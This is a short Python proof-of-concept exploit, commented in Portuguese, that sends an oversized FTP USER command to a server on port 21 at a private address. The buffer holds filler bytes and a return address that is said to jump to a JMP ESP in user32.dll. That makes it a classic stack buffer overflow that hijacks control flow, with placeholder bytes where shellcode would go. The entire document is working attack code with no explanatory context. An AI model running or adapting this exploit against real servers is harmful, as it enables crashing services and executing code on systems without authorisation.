#!/usr/bin/python
import socket

# Endereco para JMP ESP em user32.dll - 7E379353
buf = 'A' * 485 + '\x53\x93\x37\x7e' + 'C' * (1100-489)

s = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
s.connect(("192.168.16.70", 21))
s.send("USER " + buf + " \r\n")
